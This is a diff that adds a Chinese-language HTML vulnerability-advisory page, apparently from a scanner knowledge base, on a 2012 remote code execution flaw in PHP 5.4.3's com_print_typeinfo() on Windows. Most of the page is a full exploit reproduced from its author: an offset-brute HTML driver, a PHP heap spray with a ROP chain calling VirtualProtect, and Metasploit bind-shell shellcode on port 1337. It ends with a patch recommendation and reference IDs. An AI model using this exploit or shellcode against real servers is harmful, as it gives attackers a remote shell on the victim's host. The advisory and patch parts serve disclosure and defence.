@@ -1,0 +1,498 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/m.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">PHP &#39;com_print_typeinfo()&#39;远程代码执行漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									PHP是一种HTML内嵌式的语言，PHP与微软的ASP颇有几分相似，都是一种在服务器端执行的嵌入HTML文档的脚本语言，语言的风格有类似于C语言，现在被很多的网站编程人员广泛的运用。<br />
+
+									<br />
+
+									PHP 5.4.3中的函数com_print_typeinfo在实现时存在远程漏洞，php引擎在执行包含可绑定壳到端口的壳代码的恶意代码时，可被远程攻击者利用在受影响的网络服务器中执行任意代码。<br />
+
+									<br />
+
+									&lt;*来源：0in （0in.email@gmail.com）<br />
+
+									        condis<br />
+
+									  <br />
+
+									  链接：http://isc.sans.edu/diary.html?storyid=13255<br />
+
+									*&gt;<br />
+
+									测试方法：<br />
+
+									警 告<br />
+
+									<br />
+
+									以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！<br />
+
+									<br />
+
+									0in （0in.email@gmail.com）提供了如下测试方法：<br />
+
+									<br />
+
+									// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32)<br />
+
+									// Exploit author: 0in (Maksymilian Motyl)<br />
+
+									// Email: 0in(dot)email(at)gmail.com<br />
+
+									// * Bug with Variant type parsing originally discovered by Condis<br />
+
+									// Tested on Windows XP SP3 fully patched (Polish)<br />
+
+									<br />
+
+									<br />
+
+									===================<br />
+
+									offset-brute.html<br />
+
+									===================<br />
+
+									<br />
+
+									&lt;html&gt;&lt;body&gt;<br />
+
+									&lt;title&gt;0day&lt;/title&gt;<br />
+
+									&lt;center&gt;<br />
+
+									&lt;font size=7&gt;PHP 5.4.3 0day by 0in &amp; cOndis&lt;/font&gt;&lt;br&gt;<br />
+
+									&lt;textarea rows=50 cols=50 id=&quot;log&quot;&gt;&amp;lt;/textarea&amp;gt;<br />
+
+									&lt;/center&gt;<br />
+
+									&lt;script&gt;<br />
+
+									function sleep(milliseconds) {<br />
+
+									  var start = new Date().getTime();<br />
+
+									  for (var i = 0; i &lt; 1e7; i++) {<br />
+
+									    if ((new Date().getTime() - start) &gt; milliseconds){<br />
+
+									      break;<br />
+
+									    }<br />
+
+									  }<br />
+
+									}<br />
+
+									function makeRequest(url, parameters)<br />
+
+									{<br />
+
+									    var xmlhttp = new XMLHttpRequest();<br />
+
+									    if (window.XMLHttpRequest) {<br />
+
+									        xmlhttp = new XMLHttpRequest();<br />
+
+									        if (xmlhttp.overrideMimeType) {<br />
+
+									            xmlhttp.overrideMimeType(&#39;text/xml&#39;);<br />
+
+									        }<br />
+
+									    } else if (window.ActiveXObject) {<br />
+
+									        // IE<br />
+
+									        try { xmlhttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); }<br />
+
+									        catch (e) {<br />
+
+									            try { xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); }<br />
+
+									            catch (e) {}<br />
+
+									        }<br />
+
+									    }<br />
+
+									<br />
+
+									    if (!xmlhttp) {<br />
+
+									        alert(&#39;Giving up :( Cannot create an XMLHTTP instance&#39;);<br />
+
+									        return false;<br />
+
+									    }<br />
+
+									<br />
+
+									    xmlhttp.open(&quot;GET&quot;,url,true);<br />
+
+									    xmlhttp.send(null);<br />
+
+									    return true;<br />
+
+									}<br />
+
+									test=document.getElementById(&quot;log&quot;);<br />
+
+									for(offset=0;offset&lt;300;offset++)<br />
+
+									{<br />
+
+									    log.value+=&quot;Trying offset:&quot;+offset+&quot;\r\n&quot;;<br />
+
+									    makeRequest(&quot;0day.php?offset=&quot;+offset);<br />
+
+									    sleep(500);<br />
+
+									}<br />
+
+									<br />
+
+									&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<br />
+
+									<br />
+
+									<br />
+
+									<br />
+
+									===================<br />
+
+									     0day.php<br />
+
+									===================<br />
+
+									<br />
+
+									&lt;?php<br />
+
+									<br />
+
+									$spray = str_repeat(&quot;\x90&quot;,0x200);<br />
+
+									$offset=$_GET[&#39;offset&#39;];<br />
+
+									// 775DF0Da   # ADD ESP,10 # RETN    ** [ole32.dll]<br />
+
+									$spray = substr_replace($spray, &quot;\xda\xf0\x5d\x77&quot;, (strlen($spray))*-1,(strlen($spray))*-1);<br />
+
+									// :&gt; 0x048d0030<br />
+
+									$spray = substr_replace($spray, pack(&quot;L&quot;,0x048d0030+$offset), (strlen($spray)-0x8)*-1,(strlen($spray))*-1);<br />
+
+									<br />
+
+									//0x7752ae9f (RVA : 0x0005ae7f) : # XCHG EAX,ESP # MOV ECX,468B0000 # OR AL,3 # RETN   [ole32.dll]<br />
+
+									$spray = substr_replace($spray, &quot;\x9f\xae\x52\x77&quot;, (strlen($spray)-0x10)*-1,(strlen($spray))*-1);<br />
+
+									<br />
+
+									// Adress of VirtualProtect 0x7c801ad4<br />
+
+									$spray = substr_replace($spray, &quot;\xd4\x1a\x80\x7c&quot;, (strlen($spray)-0x14)*-1,(strlen($spray))*-1);<br />
+
+									<br />
+
+									//  LPVOID lpAddress  = 0x048d0060<br />
+
+									$spray = substr_replace($spray, pack(&quot;L&quot;,0x048d0060+$offset), (strlen($spray)-0x1c)*-1,(strlen($spray))*-1);<br />
+
+									<br />
+
+									// SIZE_T dwSize  = 0x01000000<br />
+
+									$spray = substr_replace($spray, &quot;\x00\x00\x10\x00&quot;, (strlen($spray)-0x20)*-1,(strlen($spray))*-1);<br />
+
+									<br />
+
+									// DWORD flNewProtect =  PAGE_EXECUTE_READWRITE (0x00000040) | 0xffffffc0<br />
+
+									$spray = substr_replace($spray, &quot;\x40\x00\x00\x00&quot;, (strlen($spray)-0x24)*-1,(strlen($spray))*-1);<br />
+
+									// __out  PDWORD lpflOldProtect = 0x04300070 | 0x105240000<br />
+
+									<br />
+
+									// 0x048d0068<br />
+
+									$spray = substr_replace($spray, pack(&quot;L&quot;,0x048d0068+$offset), (strlen($spray)-0x28)*-1,(strlen($spray))*-1);<br />
+
+									<br />
+
+									//0x77dfe8b4 : # XOR EAX,EAX # ADD ESP,18 # INC EAX # POP EBP # RETN 0C    ** [ADVAPI32.dll]<br />
+
+									$spray = substr_replace($spray, &quot;\xb4\xe8\xdf\x77&quot;, (strlen($spray)-0x18)*-1,4);<br />
+
+									// Ret Address = 0x048d0080<br />
+
+									$spray = substr_replace($spray, pack(&quot;L&quot;,0x048d0080+$offset), (strlen($spray)-0x48)*-1,4);<br />
+
+									<br />
+
+									<br />
+
+									<br />
+
+									$stacktrack = &quot;\xbc\x0c\xb0\xc0\x00&quot;;<br />
+
+									// Universal win32 bindshell on port 1337 from metasploit<br />
+
+									$shellcode = $stacktrack.&quot;\x33\xc9\x83\xe9\xb0&quot;.<br />
+
+									  &quot;\x81\xc4\xd0\xfd\xff\xff&quot;.<br />
+
+									  &quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x1d&quot;.<br />
+
+									  &quot;\xcc\x32\x69\x83\xeb\xfc\xe2\xf4\xe1\xa6\xd9\x24\xf5\x35\xcd\x96&quot;.<br />
+
+									  &quot;\xe2\xac\xb9\x05\x39\xe8\xb9\x2c\x21\x47\x4e\x6c\x65\xcd\xdd\xe2&quot;.<br />
+
+									  &quot;\x52\xd4\xb9\x36\x3d\xcd\xd9\x20\x96\xf8\xb9\x68\xf3\xfd\xf2\xf0&quot;.<br />
+
+									  &quot;\xb1\x48\xf2\x1d\x1a\x0d\xf8\x64\x1c\x0e\xd9\x9d\x26\x98\x16\x41&quot;.<br />
+
+									  &quot;\x68\x29\xb9\x36\x39\xcd\xd9\x0f\x96\xc0\x79\xe2\x42\xd0\x33\x82&quot;.<br />
+
+									  &quot;\x1e\xe0\xb9\xe0\x71\xe8\x2e\x08\xde\xfd\xe9\x0d\x96\x8f\x02\xe2&quot;.<br />
+
+									  &quot;\x5d\xc0\xb9\x19\x01\x61\xb9\x29\x15\x92\x5a\xe7\x53\xc2\xde\x39&quot;.<br />
+
+									  &quot;\xe2\x1a\x54\x3a\x7b\xa4\x01\x5b\x75\xbb\x41\x5b\x42\x98\xcd\xb9&quot;.<br />
+
+									  &quot;\x75\x07\xdf\x95\x26\x9c\xcd\xbf\x42\x45\xd7\x0f\x9c\x21\x3a\x6b&quot;.<br />
+
+									  &quot;\x48\xa6\x30\x96\xcd\xa4\xeb\x60\xe8\x61\x65\x96\xcb\x9f\x61\x3a&quot;.<br />
+
+									  &quot;\x4e\x9f\x71\x3a\x5e\x9f\xcd\xb9\x7b\xa4\x37\x50\x7b\x9f\xbb\x88&quot;.<br />
+
+									  &quot;\x88\xa4\x96\x73\x6d\x0b\x65\x96\xcb\xa6\x22\x38\x48\x33\xe2\x01&quot;.<br />
+
+									  &quot;\xb9\x61\x1c\x80\x4a\x33\xe4\x3a\x48\x33\xe2\x01\xf8\x85\xb4\x20&quot;.<br />
+
+									  &quot;\x4a\x33\xe4\x39\x49\x98\x67\x96\xcd\x5f\x5a\x8e\x64\x0a\x4b\x3e&quot;.<br />
+
+									  &quot;\xe2\x1a\x67\x96\xcd\xaa\x58\x0d\x7b\xa4\x51\x04\x94\x29\x58\x39&quot;.<br />
+
+									  &quot;\x44\xe5\xfe\xe0\xfa\xa6\x76\xe0\xff\xfd\xf2\x9a\xb7\x32\x70\x44&quot;.<br />
+
+									  &quot;\xe3\x8e\x1e\xfa\x90\xb6\x0a\xc2\xb6\x67\x5a\x1b\xe3\x7f\x24\x96&quot;.<br />
+
+									  &quot;\x68\x88\xcd\xbf\x46\x9b\x60\x38\x4c\x9d\x58\x68\x4c\x9d\x67\x38&quot;.<br />
+
+									  &quot;\xe2\x1c\x5a\xc4\xc4\xc9\xfc\x3a\xe2\x1a\x58\x96\xe2\xfb\xcd\xb9&quot;.<br />
+
+									  &quot;\x96\x9b\xce\xea\xd9\xa8\xcd\xbf\x4f\x33\xe2\x01\xf2\x02\xd2\x09&quot;.<br />
+
+									  &quot;\x4e\x33\xe4\x96\xcd\xcc\x32\x69&quot;;<br />
+
+									<br />
+
+									<br />
+
+									$spray = substr_replace($spray,$shellcode, (strlen($spray)-0x50)*-1,(strlen($shellcode)));<br />
+
+									$fullspray=&quot;&quot;;<br />
+
+									for($i=0;$i&lt;0x4b00;$i++)<br />
+
+									{<br />
+
+									    $fullspray.=$spray;<br />
+
+									}<br />
+
+									$j=array();<br />
+
+									$e=array();<br />
+
+									$b=array();<br />
+
+									$a=array();<br />
+
+									$c=array();<br />
+
+									<br />
+
+									array_push($j,$fullspray);<br />
+
+									array_push($e,$fullspray.&quot;W&quot;);<br />
+
+									array_push($b,$fullspray.&quot;A&quot;);<br />
+
+									array_push($a,$fullspray.&quot;S&quot;);<br />
+
+									array_push($c,$fullspray.&quot;!&quot;);<br />
+
+									<br />
+
+									<br />
+
+									$vVar = new VARIANT(0x048d0038+$offset);<br />
+
+									// Shoot him<br />
+
+									com_print_typeinfo($vVar); //CRASH -&gt; 102F3986   FF50 10          CALL DWORD PTR DS:[EAX+10]<br />
+
+									<br />
+
+									echo $arr;<br />
+
+									<br />
+
+									echo $spray;<br />
+
+									<br />
+
+									?&gt;<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									厂商补丁：<br />
+
+									<br />
+
+									PHP<br />
+
+									---<br />
+
+									建议升级PHP产品至最新版本，请到厂商的主页下载：http://www.php.net<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>5</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2012-05-11</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2012-05-30</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/53261" target="_blank">53261</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=19682" target="_blank">19682</a>
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
